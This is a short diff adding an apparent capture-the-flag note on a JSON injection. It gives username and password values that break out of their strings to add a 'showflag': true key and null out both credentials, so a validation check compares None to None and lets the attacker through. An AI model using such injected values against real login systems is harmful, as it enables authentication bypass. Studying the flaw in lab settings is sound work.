@@ -1,0 +1,5 @@
+its a json injection so we can inject this:
+username = 'admin", "showflag": true, "username": null, "verht":"fj'
+password = 'vzl1" ,"password": null, "verht":"fj'
+explication : in json we will take the last value so we add showfla=true
+and for username first value is a string so we need sexon value null, same for password so in validate_user function None==None true
